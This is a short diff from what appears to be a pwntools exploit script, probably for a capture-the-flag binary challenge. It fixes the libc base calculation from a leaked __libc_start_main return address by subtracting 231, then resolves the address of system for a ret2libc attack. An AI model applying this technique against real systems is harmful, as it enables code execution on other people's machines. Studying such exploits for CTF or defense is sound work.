@@ -136,7 +136,7 @@ p.recvuntil('leak:')
 leak = int(p.recv(14),16) 
 #log.info('\tleak : '+ hex(leak))
 
-libc_base = leak - libc.symbols['__libc_start_main']
+libc_base = leak - libc.symbols['__libc_start_main'] - 231
 system = libc_base + libc.symbols['system']
 
 #log.info('\tlibc base '+ hex(libc_base))
